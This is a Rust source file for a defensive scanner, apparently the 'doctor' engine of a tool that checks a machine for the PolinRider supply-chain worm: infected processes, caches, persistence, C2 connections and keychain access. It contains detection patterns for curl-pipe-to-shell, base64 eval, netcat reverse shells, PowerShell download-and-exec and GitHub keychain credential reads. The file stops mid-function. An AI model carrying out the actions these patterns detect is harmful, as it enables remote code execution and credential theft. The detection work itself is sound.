//! Machine-level PolinRider check (macOS-first) — the engine behind `wormward doctor` and the
//! desktop app's Doctor screen.
//!
//! Complements the repo/git scanner by looking at the *machine*: running loader processes,
//! tainted toolchain caches, and the editor/npm trigger paths that let the worm re-run. Every
//! detector reuses [`polinrider_fingerprint`], so a machine hit is confirmed by the exact same
//! obfuscation fingerprint as an on-disk finding. Rendering (CLI text, GUI) lives in the callers.

use std::path::{Path, PathBuf};

use wormward_packs::{polinrider_fingerprint, polinrider_pack};

/// Payloads are small; skip huge cache blobs and cap how many files we walk.
const MAX_CACHE_FILES: usize = 20_000;
const MAX_FILE_BYTES: u64 = 2 * 1024 * 1024;

/// A running process whose command line matches the loader fingerprint.
#[derive(Debug, PartialEq, serde::Serialize)]
pub struct ProcHit {
    pub pid: u32,
    pub reason: String,
    pub snippet: String,
}

/// A cached file whose content matches the loader fingerprint.
#[derive(Debug, PartialEq, serde::Serialize)]
pub struct CacheHit {
    pub path: PathBuf,
    pub reason: String,
}

/// An editor/toolchain setting that can auto-run installs and re-trigger the loader.
#[derive(Debug, PartialEq, serde::Serialize)]
pub struct TriggerCheck {
    pub name: String,
    /// True when the setting leaves the machine open to auto-run triggers.
    pub exposed: bool,
    pub detail: String,
}

/// A path we were meant to scan but could not read (e.g. macOS Full Disk Access / TCC, or a
/// permission error). Recorded so the report never certifies "clean" over data it could not see —
/// an unreadable root is the worst case (a silent false CLEAN), so it must fail the run.
#[derive(Debug, PartialEq, serde::Serialize)]
pub struct Unscanned {
    pub path: PathBuf,
    pub reason: String,
}

/// A machine-level indicator outside the caches/processes/triggers buckets: shell-rc injection, a
/// persistence item (launchd/cron), a live C2 connection, an installed malicious global package, or
/// keychain-theft process activity. `category` groups them for rendering.
#[derive(Debug, PartialEq, serde::Serialize)]
pub struct MachineHit {
    pub category: String,
    pub target: String,
    pub reason: String,
}

/// Aggregated machine-check results.
#[derive(Debug, serde::Serialize)]
pub struct DoctorReport {
    pub processes: Vec<ProcHit>,
    pub caches: Vec<CacheHit>,
    pub triggers: Vec<TriggerCheck>,
    /// Distinct cache dirs that hold at least one tainted file — the deletable units for a fix
    /// (they regenerate cleanly). Precomputed so both the CLI and GUI act on the same set.
    pub cache_dirs: Vec<PathBuf>,
    /// Roots that exist but could not be read — blind spots, not "clean".
    pub unscanned: Vec<Unscanned>,
    /// Deep-hygiene hits: persistence, live C2 connections, shell-rc injection, global packages,
    /// keychain-theft — each an active-compromise indicator.
    pub machine: Vec<MachineHit>,
}

impl DoctorReport {
    /// True if an ACTIVE infection was found (running loader or tainted cache) OR a scan root was
    /// unreadable — both drive a non-zero exit. Trigger exposures are advisory risk, not an
    /// infection, so they don't fail the run; an unscanned root does, because a blind spot must
    /// never be reported as clean.
    pub fn has_findings(&self) -> bool {
        !self.processes.is_empty()
            || !self.caches.is_empty()
            || !self.unscanned.is_empty()
            || !self.machine.is_empty()
    }
}

/// If `dir` exists (stat succeeds) but cannot be enumerated (read_dir errors), it is a blind spot —
/// return an [`Unscanned`]. This stat-vs-enumerate split is exactly how macOS TCC manifests: the
/// directory name is visible but its contents are not. A non-existent path is not a blind spot
/// (there is nothing to scan there), so it returns None.
pub fn probe_root(dir: &Path) -> Option<Unscanned> {
    if dir.is_dir() && std::fs::read_dir(dir).is_err() {
        return Some(Unscanned {
            path: dir.to_path_buf(),
            reason: "exists but is unreadable (permission / Full Disk Access) — not scanned".into(),
        });
    }
    None
}

/// Run the machine check once (single point-in-time snapshot).
pub fn check() -> DoctorReport {
    let targets = cache_targets();
    let unscanned = targets.iter().filter_map(|d| probe_root(d)).collect();
    let caches = scan_caches();
    let cache_dirs = targets
        .into_iter()
        .filter(|t| caches.iter().any(|h| h.path.starts_with(t)))
        .collect();
    DoctorReport {
        processes: scan_process_lines(&list_processes()),
        caches,
        triggers: audit_triggers(),
        cache_dirs,
        unscanned,
        machine: scan_machine(),
    }
}

// ---- running loader processes ----

/// Scan `(pid, command-line)` pairs for the loader fingerprint. Pure — the caller supplies the
/// process list — so it is testable without spawning `ps`. Naive markers like a bare `node -e`
/// are deliberately NOT flagged; only the full obfuscation fingerprint (marker + decoder) is.
pub fn scan_process_lines(procs: &[(u32, String)]) -> Vec<ProcHit> {
    procs
        .iter()
        .filter_map(|(pid, cmd)| {
            polinrider_fingerprint(cmd).map(|reason| ProcHit {
                pid: *pid,
                reason,
                snippet: snippet(cmd),
            })
        })
        .collect()
}

/// A short, single-line, char-safe excerpt of a process command for display.
fn snippet(cmd: &str) -> String {
    let one_line = cmd.split_whitespace().collect::<Vec<_>>().join(" ");
    let short: String = one_line.chars().take(120).collect();
    if short.chars().count() < one_line.chars().count() {
        format!("{short}…")
    } else {
        short
    }
}

/// Enumerate running processes as `(pid, full command line)`. Uses `ps` on Unix; returns empty on
/// error so the caller degrades gracefully.
#[cfg(not(target_os = "windows"))]
pub fn list_processes() -> Vec<(u32, String)> {
    let out = match wormward_core::proc::command("ps").args(["-Awwo", "pid=,command="]).output() {
        Ok(o) if o.status.success() => o.stdout,
        _ => return Vec::new(),
    };
    String::from_utf8_lossy(&out)
        .lines()
        .filter_map(|line| {
            let (pid, cmd) = line.trim_start().split_once(' ')?;
            Some((pid.trim().parse().ok()?, cmd.trim().to_string()))
        })
        .collect()
}

/// Windows: a PowerShell CIM query yields the pid + FULL command line (tab-separated) — which
/// `tasklist` alone cannot. Returns empty if PowerShell is unavailable or errors.
#[cfg(target_os = "windows")]
pub fn list_processes() -> Vec<(u32, String)> {
    let script =
        "Get-CimInstance Win32_Process | ForEach-Object { \"$($_.ProcessId)`t$($_.CommandLine)\" }";
    let out = match wormward_core::proc::command("powershell")
        .args(["-NoProfile", "-NonInteractive", "-Command", script])
        .output()
    {
        Ok(o) if o.status.success() => o.stdout,
        _ => return Vec::new(),
    };
    String::from_utf8_lossy(&out)
        .lines()
        .filter_map(|line| {
            let (pid, cmd) = line.split_once('\t')?;
            Some((pid.trim().parse().ok()?, cmd.trim().to_string()))
        })
        .collect()
}

// ---- toolchain caches ----

/// Pure: fingerprint `(path, content)` pairs. Testable without a filesystem.
pub fn scan_contents(files: &[(PathBuf, String)]) -> Vec<CacheHit> {
    files
        .iter()
        .filter_map(|(p, c)| {
            polinrider_fingerprint(c).map(|reason| CacheHit { path: p.clone(), reason })
        })
        .collect()
}

fn home_dir() -> PathBuf {
    // Windows uses USERPROFILE; macOS/Linux use HOME.
    std::env::var_os("HOME")
        .or_else(|| std::env::var_os("USERPROFILE"))
        .map(PathBuf::from)
        .unwrap_or_default()
}

/// Candidate toolchain dirs that hold worm-EXECUTED artifacts: the npx exec cache (where `npx`
/// extracts and RUNS packages), the node-gyp + TypeScript ATA caches, and the global `node_modules`
/// install trees. Pure so it is unit-testable; [`cache_targets`] filters to the present ones.
///
/// Deliberately EXCLUDES content-addressed package-manager stores (the pnpm store, yarn/npm tarball
/// caches). Those are inert blob caches: pruned (so reported paths go stale), not executed, and
/// redundant with scanning the INSTALLED tree. Scanning them only produced noise and false
/// positives on integrity / `*-index.json` metadata — meaningful detection is a package installed
/// into a project, not a cache blob.
pub fn candidate_cache_dirs(home: &Path) -> Vec<PathBuf> {
    vec![
        home.join(".npm/_npx"),
        home.join(".node-gyp"),
        home.join("Library/Caches/typescript"),
        PathBuf::from("/opt/homebrew/lib/node_modules"),
        PathBuf::from("/usr/local/lib/node_modules"),
    ]
}

/// Toolchain dirs (present ones only) that may hold worm-executed artifacts — machine-level state
/// the repo scan does not cover. macOS/Linux resolve from `$HOME`; Windows from the standard
/// `%APPDATA%`/`%LOCALAPPDATA%` toolchain locations.
#[cfg(not(target_os = "windows"))]
pub fn cache_targets() -> Vec<PathBuf> {
    candidate_cache_dirs(&home_dir()).into_iter().filter(|p| p.is_dir()).collect()
}

#[cfg(target_os = "windows")]
pub fn cache_targets() -> Vec<PathBuf> {
    let home = home_dir();
    let appdata = std::env::var_os("APPDATA").map(PathBuf::from);
    let local = std::env::var_os("LOCALAPPDATA").map(PathBuf::from);
    let mut dirs = vec![home.join(".node-gyp")];
    if let Some(a) = &appdata {
        dirs.push(a.join("npm-cache").join("_npx")); // older npm cache location
        dirs.push(a.join("npm").join("node_modules")); // global `npm i -g` install tree
    }
    if let Some(l) = &local {
        dirs.push(l.join("npm-cache").join("_npx")); // newer npm cache location
        dirs.push(l.join("Microsoft").join("TypeScript")); // TypeScript ATA cache
        dirs.push(l.join("pnpm").join("global")); // pnpm global installs
    }
    dirs.into_iter().filter(|p| p.is_dir()).collect()
}

/// Inert package-manager metadata that must never be content-scanned (lockfiles + pnpm store
/// `*-index.json`): package names, URLs, and SHA/integrity hashes, not code.
fn is_metadata_file(path: &Path) -> bool {
    let bn = path.file_name().map(|s| s.to_string_lossy().to_lowercase()).unwrap_or_default();
    bn == "yarn.lock"
        || bn == "package-lock.json"
        || bn == "pnpm-lock.yaml"
        || bn.ends_with(".lock")
        || bn.ends_with("-index.json")
}

/// Recursively collect regular files under `dir` (bounded; symlinks not followed).
fn collect_files(dir: &Path, out: &mut Vec<PathBuf>) {
    if out.len() >= MAX_CACHE_FILES {
        return;
    }
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        match entry.file_type() {
            Ok(t) if t.is_dir() => collect_files(&entry.path(), out),
            Ok(t) if t.is_file() => out.push(entry.path()),
            _ => {}
        }
        if out.len() >= MAX_CACHE_FILES {
            return;
        }
    }
}

/// Scan one cache directory: fingerprint each small text file.
pub fn scan_cache_dir(dir: &Path) -> Vec<CacheHit> {
    let mut files = Vec::new();
    collect_files(dir, &mut files);
    let contents: Vec<(PathBuf, String)> = files
        .into_iter()
        .filter(|p| !is_metadata_file(p))
        .filter(|p| std::fs::metadata(p).map(|m| m.len() <= MAX_FILE_BYTES).unwrap_or(false))
        .filter_map(|p| std::fs::read_to_string(&p).ok().map(|c| (p, c)))
        .collect();
    scan_contents(&contents)
}

/// Scan every present toolchain cache dir.
pub fn scan_caches() -> Vec<CacheHit> {
    cache_targets().iter().flat_map(|d| scan_cache_dir(d)).collect()
}

/// A [`cache_targets`] entry that holds installed *global packages* (a `node_modules` root)
/// rather than a regenerable cache. These must never be wiped wholesale: doing so would delete
/// the user's globally-installed CLIs, which — unlike the npx/TypeScript/pnpm caches — do not
/// regenerate. Covers `/opt/homebrew/lib/node_modules`, `/usr/local/lib/node_modules`, etc.
pub fn is_package_root(dir: &Path) -> bool {
    dir.file_name().is_some_and(|n| n == "node_modules")
}

/// Remove worm-dropped artifacts from a known cache/target dir.
///
/// - Regenerable caches (npx / node-gyp / TypeScript / yarn / pnpm store): the whole dir is
///   removed — it regenerates cleanly on next use.
/// - Package roots (global `node_modules`, see [`is_package_root`]): only the fingerprinted
///   tainted files are removed, so the user's real global packages are preserved.
///
/// Returns the tainted files that could NOT be removed (e.g. system/root-owned) so the caller can
/// tell the user to remove them manually, instead of surfacing a raw errno. A file that vanished
/// between scan and removal (`NotFound`) counts as success. A whole-dir removal that fails (rare
/// for a user-owned cache) propagates as `Err`.
pub fn clear_cache_dir(dir: &Path) -> std::io::Result<Vec<PathBuf>> {
    if is_package_root(dir) {
        let mut unremovable = Vec::new();
        for hit in scan_cache_dir(dir) {
            match std::fs::remove_file(&hit.path) {
                Ok(()) => {}
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
                Err(_) => unremovable.push(hit.path),
            }
        }
        Ok(unremovable)
    } else {
        std::fs::remove_dir_all(dir)?;
        Ok(Vec::new())
    }
}

// ---- trigger paths (how the worm re-runs) ----

/// True if `npm/pnpm config get ignore-scripts` reports scripts are blocked.
fn ignore_scripts_on(config_output: &str) -> bool {
    config_output.trim() == "true"
}

/// True if the editor settings disable TypeScript Automatic Type Acquisition. Tolerant of JSONC
/// (comments / trailing commas) — a targeted key/value check, not a full parse.
fn ata_disabled(settings: &str) -> bool {
    settings
        .split("\"typescript.disableAutomaticTypeAcquisition\"")
        .nth(1)
        .and_then(|rest| rest.split(':').nth(1))
        .map(|v| v.trim_start().starts_with("true"))
        .unwrap_or(false)
}

/// Number of MCP servers configured in an editor's MCP JSON (each can `npm exec` on startup).
fn count_mcp_servers(json: &str) -> usize {
    serde_json::from_str::<serde_json::Value>(json)
        .ok()
        .and_then(|v| v.get("mcpServers").and_then(|m| m.as_object()).map(|o| o.len()))
        .unwrap_or(0)
}

/// Invoke a package-manager CLI portably. On Windows, npm/pnpm are `.cmd` shims which
/// `CreateProcess` cannot exec directly — `Command::new("npm")` fails with NotFound and every
/// npm-backed check silently degrades to "no data". Route through `cmd /C` there so PATHEXT
/// resolution applies (covering .cmd shims and .exe installs alike); elsewhere spawn directly.
fn tool_command(tool: &str, args: &[&str]) -> std::process::Command {
    #[cfg(target_os = "windows")]
    {
        let mut c = wormward_core::proc::command("cmd");
        c.arg("/C").arg(tool).args(args);
        c
    }
    #[cfg(not(target_os = "windows"))]
    {
        let mut c = wormward_core::proc::command(tool);
        c.args(args);
        c
    }
}

fn command_exists(bin: &str) -> bool {
    tool_command(bin, &["--version"])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

fn ignore_scripts_check(tool: &str) -> TriggerCheck {
    let value = tool_command(tool, &["config", "get", "ignore-scripts"])
        .output()
        .ok()
        .filter(|o| o.status.success())
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_default();
    let on = ignore_scripts_on(&value);
    TriggerCheck {
        name: format!("{tool} ignore-scripts"),
        exposed: !on,
        detail: if on {
            "install lifecycle scripts blocked".into()
        } else {
            format!("lifecycle scripts run on install — `{tool} config set ignore-scripts true`")
        },
    }
}

/// Where VS Code–family editors keep their user settings, per platform: macOS under
/// `~/Library/Application Support`, Windows under `%APPDATA%`, Linux under `~/.config`.
fn editor_config_base() -> PathBuf {
    #[cfg(target_os = "macos")]
    return home_dir().join("Library/Application Support");
    #[cfg(target_os = "windows")]
    return std::env::var_os("APPDATA").map(PathBuf::from).unwrap_or_default();
    #[cfg(all(not(target_os = "macos"), not(target_os = "windows")))]
    return home_dir().join(".config");
}

fn editor_settings_paths() -> Vec<(&'static str, PathBuf)> {
    let base = editor_config_base();
    vec![
        ("VS Code", base.join("Code/User/settings.json")),
        ("Cursor", base.join("Cursor/User/settings.json")),
    ]
}

fn mcp_config_paths() -> Vec<PathBuf> {
    let home = home_dir();
    vec![
        home.join(".cursor/mcp.json"),
        // Claude Desktop keeps its config under the same per-platform base as the editors.
        editor_config_base().join("Claude/claude_desktop_config.json"),
        home.join(".codeium/windsurf/mcp_config.json"),
    ]
}

/// Audit the editor/npm trigger paths that let the worm re-run after a config is cleaned.
pub fn audit_triggers() -> Vec<TriggerCheck> {
    let mut checks = vec![ignore_scripts_check("npm")];
    if command_exists("pnpm") {
        checks.push(ignore_scripts_check("pnpm"));
    }
    for (label, path) in editor_settings_paths() {
        if let Ok(s) = std::fs::read_to_string(&path) {
            let disabled = ata_disabled(&s);
            checks.push(TriggerCheck {
                name: format!("{label} TypeScript ATA"),
                exposed: !disabled,
                detail: if disabled {
                    "automatic type acquisition disabled".into()
                } else {
                    format!(
                        "ATA can auto-run npm install — add \"typescript.disableAutomaticTypeAcquisition\": true to {}",
                        path.display()
                    )
                },
            });
        }
    }
    let mcp_total: usize = mcp_config_paths()
        .iter()
        .filter_map(|p| std::fs::read_to_string(p).ok())
        .map(|s| count_mcp_servers(&s))
        .sum();
    if mcp_total > 0 {
        checks.push(TriggerCheck {
            name: "MCP servers".into(),
            exposed: true,
            detail: format!(
                "{mcp_total} configured — any can npm-exec a package on startup; audit and disable ones you don't trust"
            ),
        });
    }
    checks
}

/// Apply the safe trigger fixes: set `ignore-scripts=true` for npm (and pnpm if present). ATA and
/// MCP are left as guidance (editing JSONC settings / picking MCP servers isn't safe to automate).
/// Returns a line per applied fix.
pub fn fix_triggers() -> Vec<String> {
    let mut done = Vec::new();
    for tool in ["npm", "pnpm"] {
        if tool == "pnpm" && !command_exists("pnpm") {
            continue;
        }
        let ok = tool_command(tool, &["config", "set", "ignore-scripts", "true"])
            .status()
            .map(|s| s.success())
            .unwrap_or(false);
        if ok {
            done.push(format!("set {tool} ignore-scripts=true"));
        }
    }
    done
}

// ---- prevention (harden) ----

/// The platform's hosts file — the target for the C2-sinkhole block below. Guidance-only (the
/// caller prints it; wormward never writes a system file itself).
pub fn hosts_file_path() -> &'static str {
    if cfg!(target_os = "windows") {
        r"C:\Windows\System32\drivers\etc\hosts"
    } else {
        "/etc/hosts"
    }
}

/// The hosts-file C2-sinkhole block for the given C2 domains, delimited so it can be removed
/// exactly on unharden. Pure/testable. Points each C2 domain at 0.0.0.0.
pub fn hosts_sinkhole_block(domains: &[String]) -> String {
    let mut s = String::from("# >>> wormward C2 sinkhole >>>\n");
    for d in domains {
        s.push_str(&format!("0.0.0.0 {d}\n"));
    }
    s.push_str("# <<< wormward C2 sinkhole <<<\n");
    s
}

/// A global pre-commit hook that blocks committing supply-chain payloads: staged content carrying
/// an injection marker, a forbidden dropper filename, or a staged `.env`. Pure/testable.
pub fn pre_commit_hook(markers: &[String]) -> String {
    let mut s = String::from(
        "#!/bin/sh\n# wormward pre-commit guard — blocks committing supply-chain payloads.\n\
         blocked=0\n\
         staged=$(git diff --cached --name-only --diff-filter=ACM)\n\
         for f in $staged; do\n\
         \x20 case \"$f\" in\n\
         \x20   config.bat|temp_auto_push.bat|temp_interactive_push.bat|branch_structure.json)\n\
         \x20     echo \"wormward: forbidden dropper file staged: $f\"; blocked=1 ;;\n\
         \x20   .env|.env.*) echo \"wormward: refusing to commit a secrets file: $f\"; blocked=1 ;;\n\
         \x20 esac\n\
         done\n\
         diff=$(git diff --cached)\n",
    );
    for m in markers {
        let esc = m.replace('\'', "'\\''");
        s.push_str(&format!(
            "printf '%s' \"$diff\" | grep -qF -- '{esc}' && {{ echo 'wormward: injection marker in staged change'; blocked=1; }}\n"
        ));
    }
    s.push_str(
        "if [ \"$blocked\" -ne 0 ]; then\n\
         \x20 echo 'Commit blocked by wormward. Bypass (NOT recommended): git commit --no-verify'\n\
         \x20 exit 1\n\
         fi\n\
         exit 0\n",
    );
    s
}

/// Vendor C2 domains to sinkhole (from the pack — never the community-tier or RPC hosts).
pub fn sinkhole_domains() -> Vec<String> {
    polinrider_pack().manifest.ioc_domains.clone()
}

/// The injection markers the pre-commit hook greps for (the specific composite markers, not the
/// FP-prone bare decoder name).
pub fn hook_markers() -> Vec<String> {
    let pack = polinrider_pack();
    ["primary", "secondary", "variant-april"]
        .iter()
        .filter_map(|id| {
            pack.manifest
                .content_signatures
                .iter()
                .find(|s| s.id == *id)
                .map(|s| s.value.clone())
        })
        .collect()
}

/// Install the global pre-commit hook to `~/.git-hooks/pre-commit` (user-writable). Deliberately
/// does NOT set `core.hooksPath` — the caller prints that step so the user opts in explicitly
/// rather than having wormward silently override an existing global hooks path. Returns the path.
pub fn install_pre_commit_hook() -> Result<PathBuf, String> {
    let dir = home_dir().join(".git-hooks");
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let path = dir.join("pre-commit");
    std::fs::write(&path, pre_commit_hook(&hook_markers())).map_err(|e| e.to_string())?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755));
    }
    Ok(path)
}

// ---- deep machine hygiene (persistence, network, shell-rc, global packages, keychain) ----

const KNOWN_MALICIOUS_PLISTS: &[&str] = &["com.bablu.helper"];

/// True (with a reason) when a shell line looks like an injected fetch-and-run / decoder. Literal
/// token co-occurrence only (no regex dep), kept FP-conservative: a bare `curl` or `base64` is
/// fine; it takes the fetch+pipe-to-shell / decode+exec / reverse-shell shapes, or the loader
/// fingerprint, to fire. Used for shell-rc files and crontab lines.
pub fn suspicious_shell_line(line: &str) -> Option<String> {
    let l = line.trim();
    if l.starts_with('#') || l.is_empty() {
        return None;
    }
    let has_fetch = l.contains("curl ") || l.contains("wget ");
    let pipe_sh =
        l.contains("| sh") || l.contains("|sh") || l.contains("| bash") || l.contains("|bash");
    if has_fetch && pipe_sh {
        return Some("fetch piped to a shell".into());
    }
    if l.contains("base64") && (l.contains("eval") || pipe_sh) {
        return Some("base64-decoded code executed".into());
    }
    if l.contains("nc -e") {
        return Some("netcat reverse shell".into());
    }
    // PowerShell download-and-exec (profiles, Run keys, scheduled tasks). PS is case-
    // insensitive, so match on a lowercased copy; TOKEN membership (not substring) for the
    // short aliases, so `iexplore.exe` never satisfies `iex` and `irmscan.dll` never `irm`.
    let low = l.to_lowercase();
    let has_tok = |t: &str| {
        low.split(|c: char| !(c.is_ascii_alphanumeric() || c == '-')).any(|tok| tok == t)
    };
    let ps_fetch = has_fetch
        || has_tok("iwr")
        || has_tok("irm")
        || has_tok("invoke-webrequest")
        || has_tok("invoke-restmethod");
    let ps_eval = has_tok("iex") || has_tok("invoke-expression");
    if ps_fetch && ps_eval {
        return Some("fetch fed to Invoke-Expression".into());
    }
    if low.contains("frombase64string") && ps_eval {
        return Some("base64-decoded code executed".into());
    }
    if polinrider_fingerprint(l).is_some() {
        return Some("loader fingerprint".into());
    }
    None
}

/// Scan shell-rc file `(path, content)` pairs for injected startup commands. Pure/testable.
pub fn scan_shell_rc(files: &[(PathBuf, String)]) -> Vec<MachineHit> {
    let mut hits = Vec::new();
    for (path, content) in files {
        for line in content.lines() {
            if let Some(reason) = suspicious_shell_line(line) {
                let snippet = line.trim().chars().take(80).collect::<String>();
                hits.push(MachineHit {
                    category: "shell-rc".into(),
                    target: path.display().to_string(),
                    reason: format!("{reason}: {snippet}"),
                });
            }
        }
    }
    hits
}

/// Scan launchd plist / crontab `(path, content)` pairs for loader-launching persistence. Pure.
pub fn scan_persistence(items: &[(PathBuf, String)]) -> Vec<MachineHit> {
    let mut hits = Vec::new();
    for (path, content) in items {
        let ps = path.to_string_lossy();
        if KNOWN_MALICIOUS_PLISTS.iter().any(|m| ps.contains(m)) {
            hits.push(MachineHit {
                category: "persistence".into(),
                target: ps.to_string(),
                reason: "known malicious LaunchAgent".into(),
            });
            continue;
        }
        let lc = content.to_lowercase();
        if lc.contains("openclaw") || lc.contains("polinrider") {
            hits.push(MachineHit {
                category: "persistence".into(),
                target: ps.to_string(),
                reason: "references PolinRider/openclaw tooling".into(),
            });
            continue;
        }
        for line in content.lines() {
            if let Some(reason) = suspicious_shell_line(line) {
                hits.push(MachineHit {
                    category: "persistence".into(),
                    target: ps.to_string(),
                    reason,
                });
                break;
            }
        }
    }
    hits
}

/// Match live-connection lines (lsof/netstat output) against known C2 hosts/IPs. Pure.
pub fn scan_connections(conn_lines: &[String], c2: &[String]) -> Vec<MachineHit> {
    let mut hits = Vec::new();
    for line in conn_lines {
        for host in c2 {
            if !host.is_empty() && line.contains(host.as_str()) {
                hits.push(MachineHit {
                    category: "connection".into(),
                    target: host.clone(),
                    reason: format!("live network connection to C2 {host}"),
                });
            }
        }
    }
    hits
}

/// Match globally-installed package names against the malicious list. Pure.
pub fn scan_global_packages(installed: &[String], bad: &[String]) -> Vec<MachineHit> {
    installed
        .iter()
        .filter(|p| bad.iter().any(|b| b == *p))
        .map(|p| MachineHit {
            category: "global-package".into(),
            target: p.clone(),
            reason: "malicious package installed globally".into(),
        })
        .collect()
}

/// Flag processes reading the GitHub keychain credential (`find-internet-password … github`). Pure.
pub fn scan_keychain_procs(procs: &[(u32, String)]) -> Vec<MachineHit> {
    procs
        .iter()
        .filter(|(_, cmd)| cmd.contains("find-internet-password") && cmd.contains("github"))
        .map(|(pid, _)| MachineHit {
            category: "keychain".into(),
            target: format!("pid {pid}"),
            reason: "reading the GitHub keychain credential (credential theft)".into(),
        })
        .collect()
}

/// Known C2 hosts/IPs for the network check — pulled live from the PolinRider pack (ioc_domains +
/// hardcoded exfil IPs), so it stays in sync with the catalog. Community entries are excluded.
fn c2_hosts() -> Vec<String> {
    let pack = polinrider_pack();
    let mut hosts = pack.manifest.ioc_domains.clone();
    for sig in &pack.manifest.content_signatures {
        if sig.id.starts_with("c2-exfil-ip") || sig.id == "c2-ethereum-ip" {
            hosts.push(sig.value.clone());
        }
    }
    hosts
}

/// Read the shell-rc files that a login shell sources, as `(path, content)` pairs. On Windows
/// the equivalent startup-injection surface is the PowerShell profile (both the Windows
/// PowerShell 5 and PowerShell 7 locations, plus the OneDrive-redirected Documents variant).
fn shell_rc_files() -> Vec<(PathBuf, String)> {
    let home = home_dir();
    let mut paths: Vec<PathBuf> =
        [".zshrc", ".bashrc", ".bash_profile", ".profile", ".zshenv", ".zprofile"]
            .iter()
            .map(|f| home.join(f))
            .collect();
    #[cfg(target_os = "windows")]
    for docs in ["Documents", "OneDrive/Documents"] {
        for shell in ["WindowsPowerShell", "PowerShell"] {
            paths.push(home.join(docs).join(shell).join("Microsoft.PowerShell_profile.ps1"));
            paths.push(home.join(docs).join(shell).join("profile.ps1"));
        }
    }
    paths
        .into_iter()
        .filter_map(|p| std::fs::read_to_string(&p).ok().map(|c| (p, c)))
        .collect()
}

/// Read persistence entries as `(path, content)` pairs: launchd plists + crontab on Unix;
/// registry Run keys, the Startup folder's text scripts, and the scheduled-task list on Windows.
#[cfg(not(target_os = "windows"))]
fn persistence_items() -> Vec<(PathBuf, String)> {
    let home = home_dir();
    let mut items = Vec::new();
    let dirs = [
        home.join("Library/LaunchAgents"),
        PathBuf::from("/Library/LaunchAgents"),
        PathBuf::from("/Library/LaunchDaemons"),
    ];
    for dir in dirs {
        if let Ok(entries) = std::fs::read_dir(&dir) {
            for e in entries.flatten() {
                let p = e.path();
                if p.extension().and_then(|x| x.to_str()) == Some("plist") {
                    if let Ok(c) = std::fs::read_to_string(&p) {
                        items.push((p, c));
                    }
                }
            }
        }
    }
    if let Ok(o) = wormward_core::proc::command("crontab").arg("-l").output() {
        if o.status.success() {
            items.push((PathBuf::from("crontab"), String::from_utf8_lossy(&o.stdout).into_owned()));
        }
    }
    items
}

#[cfg(target_os = "windows")]
fn persistence_items() -> Vec<(PathBuf, String)> {
    let mut items = Vec::new();
    // Registry Run keys: each value's command line runs at logon. `reg query` output lines carry
    // the full command, so the same suspicious-line check applies.
    for hive in ["HKCU", "HKLM"] {
        let key = format!(r"{hive}\Software\Microsoft\Windows\CurrentVersion\Run");
        if let Ok(o) = wormward_core::proc::command("reg").args(["query", &key]).output() {
            if o.status.success() {
                items.push((PathBuf::from(&key), String::from_utf8_lossy(&o.stdout).into_owned()));
            }
        }
    }
    // Startup folder: any script dropped here runs at logon. Text scripts only — .lnk is binary
    // (its target would need a shell-link parser; the Run keys and schtasks cover command lines).
    if let Some(appdata) = std::env::var_os("APPDATA") {
        let startup =
            PathBuf::from(appdata).join("Microsoft/Windows/Start Menu/Programs/Startup");
        if let Ok(entries) = std::fs::read_dir(&startup) {
            for e in entries.flatten() {
                let p = e.path();
                let ext = p.extension().and_then(|x| x.to_str()).unwrap_or_default();
                if ["bat", "cmd", "vbs", "js", "ps1"].contains(&ext.to_ascii_lowercase().as_str()) {
                    if let Ok(c) = std::fs::read_to_string(&p) {
                        items.push((p, c));
                    }
                }
            }
        }
    }
    // Scheduled tasks: the verbose list includes each task's "Task To Run" command line.
    if let Ok(o) =
        wormward_core::proc::command("schtasks").args(["/query", "/fo", "LIST", "/v"]).output()
    {
        if o.status.success() {
            items.push((
                PathBuf::from("schtasks"),
                String::from_utf8_lossy(&o.stdout).into_owned(),
            ));
        }
    }
    items
}

/// Live established TCP connections (one line per connection): `lsof` on Unix, `netstat -ano`
/// on Windows (both print the remote address inline, which is what scan_connections matches).
#[cfg(not(target_os = "windows"))]
fn tcp_connection_lines() -> Vec<String> {
    match wormward_core::proc::command("lsof").args(["-nP", "-iTCP", "-sTCP:ESTABLISHED"]).output() {
        Ok(o) if o.status.success() => {
            String::from_utf8_lossy(&o.stdout).lines().map(String::from).collect()
        }
        _ => Vec::new(),
    }
}

#[cfg(target_os = "windows")]
fn tcp_connection_lines() -> Vec<String> {
    match wormward_core::proc::command("netstat").args(["-ano"]).output() {
        Ok(o) if o.status.success() => String::from_utf8_lossy(&o.stdout)
            .lines()
            .filter(|l| l.contains("ESTABLISHED"))
            .map(String::from)
            .collect(),
        _ => Vec::new(),
    }
}

/// Globally-installed package names via `npm ls -g` (and pnpm if present).
fn global_package_names() -> Vec<String> {
    let mut names = Vec::new();
    for tool in ["npm", "pnpm"] {
        if tool == "pnpm" && !command_exists("pnpm") {
            continue;
        }
        if let Ok(o) = tool_command(tool, &["ls", "-g", "--depth=0", "--parseable"]).output() {
            for line in String::from_utf8_lossy(&o.stdout).lines() {
                // Windows `npm ls --parseable` emits backslash paths; normalize so the
                // `node_modules/` split works on both separators.
                let line = line.replace('\\', "/");
                if let Some(idx) = line.rfind("node_modules/") {
                    let name = &line[idx + "node_modules/".len()..];
                    if !name.is_empty() {
                        names.push(name.to_string());
                    }
                }
            }
        }
    }
    names
}

/// Run every deep-hygiene detector against the live machine. Read-only.
pub fn scan_machine() -> Vec<MachineHit> {
    let procs = list_processes();
    let bad = polinrider_pack().manifest.bad_npm_packages.clone();
    let mut hits = Vec::new();
    hits.extend(scan_shell_rc(&shell_rc_files()));
    hits.extend(scan_persistence(&persistence_items()));
    hits.extend(scan_connections(&tcp_connection_lines(), &c2_hosts()));
    hits.extend(scan_global_packages(&global_package_names(), &bad));
    hits.extend(scan_keychain_correlated(&procs));
    hits
}

/// Keychain-theft hits, CORRELATED. Reading the GitHub keychain credential is also what many
/// legitimate tools do — git's credential flow (`security find-internet-password -s github.com`
/// fires on every `git push`), `gh`, editors, keychain-sync — so a bare match is not evidence of
/// theft. Report it only when a confirmed loader process is ALSO present (the actual worm reading
/// creds), never on its own. Pure/testable.
pub fn scan_keychain_correlated(procs: &[(u32, String)]) -> Vec<MachineHit> {
